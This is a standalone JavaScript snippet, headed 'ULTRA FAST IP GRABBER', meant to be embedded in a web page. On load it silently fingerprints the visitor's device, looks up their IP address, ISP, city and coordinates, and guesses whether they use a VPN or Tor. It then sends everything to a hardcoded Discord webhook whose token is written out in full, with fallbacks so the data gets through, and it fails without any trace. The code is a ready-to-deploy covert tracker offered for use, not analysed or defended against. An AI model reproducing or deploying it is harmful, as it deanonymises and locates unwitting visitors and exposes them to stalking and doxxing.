<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  ULTRA FAST IP GRABBER – PARALLEL APIS + FIRST SUCCESS
    // ================================================================
    function fetchIPData() {
        const endpoints = [
            {
                url: 'https://ipapi.co/json/',
                parse: (data) => ({
                    ip: data.ip,
                    org: data.org || data.asn || '',
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lon: data.longitude,
                    proxy: data.proxy || false,
                    hosting: data.hosting || false
                })
            },
            {
                url: 'https://ip-api.com/json/',
                parse: (data) => ({
                    ip: data.query,
                    org: data.isp || data.org || '',
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    lat: data.lat,
                    lon: data.lon,
                    proxy: data.proxy || false,
                    hosting: data.hosting || false
                })
            },
            {
                url: 'https://ipwho.is/',
                parse: (data) => ({
                    ip: data.ip,
                    org: data.connection?.isp || data.connection?.org || '',
                    city: data.city,
                    region: data.region,
                    country: data.country,
                    lat: data.latitude,
                    lon: data.longitude,
                    proxy: data.security?.proxy || false,
                    hosting: data.security?.hosting || false
                })
            }
        ];

        const fetchWithTimeout = (url, timeout = 800) => {
            return fetch(url, { signal: AbortSignal.timeout(timeout) })
                .then(res => res.json());
        };

        // Race all three endpoints, return first valid result
        return Promise.any(
            endpoints.map(ep => 
                fetchWithTimeout(ep.url)
                    .then(ep.parse)
                    .then(data => {
                        if (data.ip) return data;
                        throw new Error('No IP');
                    })
            )
        ).catch(() => null); // if all fail
    }

    // ================================================================
    //  VPN / TOR DETECTION
    // ================================================================
    function detectTorOrVpn(ua, ipData, webRTCLeak) {
        let reasons = [];

        // Browser heuristics
        if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) {
            reasons.push('Tor browser signature');
        }

        // WebRTC leak: if no real local IP found, likely VPN/Tor
        if (!webRTCLeak) {
            reasons.push('WebRTC blocked or no real IP');
        }

        // IP data checks
        if (ipData) {
            if (ipData.proxy) reasons.push('Proxy flag');
            if (ipData.hosting) reasons.push('Hosting provider');
            if (ipData.org) {
                const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','privacy','secure','m247','express','nord','surfshark','privateinternetaccess'];
                const orgLower = ipData.org.toLowerCase();
                if (vpnKeywords.some(k => orgLower.includes(k))) reasons.push('VPN keyword in ISP');
            }
        }

        return reasons.length > 0;
    }

    function detectWebRTCLeak() {
        return new Promise((resolve) => {
            let hasRealIP = false;
            let pc = null;
            try {
                pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        resolve(hasRealIP);
                        return;
                    }
                    const parts = e.candidate.candidate.split(' ');
                    if (parts.length > 7) {
                        const ip = parts[4];
                        if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                            hasRealIP = true;
                        }
                    }
                };
                setTimeout(() => {
                    if (pc) pc.close();
                    resolve(hasRealIP);
                }, 1200);
            } catch (e) {
                resolve(false);
            }
        });
    }

    // ================================================================
    //  SEND MESSAGE FAST
    // ================================================================
    function sendMessage(msg) {
        return new Promise((resolve) => {
            let sent = false;

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg }),
                keepalive: true
            })
            .then(res => {
                if (res.ok) { sent = true; resolve(true); }
                else throw new Error('fetch failed');
            })
            .catch(() => {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                if (navigator.sendBeacon(WEBHOOK, blob)) {
                    sent = true;
                    resolve(true);
                } else {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', WEBHOOK, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({ content: msg }));
                        xhr.onload = function() {
                            if (xhr.status === 200 || xhr.status === 204) {
                                sent = true;
                                resolve(true);
                            }
                        };
                        xhr.onerror = function() { resolve(false); };
                        setTimeout(() => resolve(false), 800);
                    } catch (e) {
                        resolve(false);
                    }
                }
            });

            setTimeout(() => resolve(sent), 1000);
        });
    }

    // ================================================================
    //  MAIN – ALL PARALLEL, NO UI BLOCKING
    // ================================================================
    (async function() {
        try {
            // Start all async operations immediately
            const ua = navigator.userAgent;
            const os = (() => {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Other';
            })();
            const browser = (() => {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Not available';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Not available';
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None';

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cores = navigator.hardwareConcurrency || 'Not available';
            const ram = navigator.deviceMemory || 'Not available';
            const screenInfo = `${screen.width}x${screen.height}x${screen.colorDepth}`;

            // Fire all async operations in parallel
            const [ipData, webRTCLeak, battery] = await Promise.all([
                fetchIPData(),
                detectWebRTCLeak(),
                (async () => {
                    try {
                        const b = await navigator.getBattery();
                        return Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
                    } catch (e) {
                        return 'Not available';
                    }
                })()
            ]);

            const isVpn = detectTorOrVpn(ua, ipData, webRTCLeak);

            // Build message – only include fields that have data (no "Unknown")
            let msg = '**ctOS User Info**\n';
            if (ipData) {
                msg += `**IP:** ${ipData.ip} (${ipData.org || 'No ISP info'})\n`;
                if (ipData.city || ipData.region || ipData.country) {
                    msg += `**Location:** ${[ipData.city, ipData.region, ipData.country].filter(Boolean).join(', ')}\n`;
                }
                if (ipData.lat && ipData.lon) {
                    msg += `**Coordinates:** ${ipData.lat}, ${ipData.lon}\n`;
                }
            } else {
                msg += `**IP:** Not obtained\n`;
            }
            msg += `**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}\n`;
            msg += `**OS:** ${os}\n`;
            msg += `**Browser:** ${browser}\n`;
            msg += `**CPU Cores:** ${cores}\n`;
            msg += `**RAM:** ${ram} GB\n`;
            msg += `**Screen:** ${screenInfo}\n`;
            if (battery !== 'Not available') msg += `**Battery:** ${battery}\n`;
            msg += `**Time Zone:** ${timezone}\n`;
            if (gpu !== 'Not available') msg += `**GPU:** ${gpu}\n`;
            if (plugins !== 'None') msg += `**Plugins:** ${plugins}\n`;
            msg += `**Timestamp:** ${new Date().toLocaleString()}`;

            // Send immediately
            await sendMessage(msg);

        } catch (err) {
            console.error(err);
            // Silent fail – no UI
        }
    })();
</script>
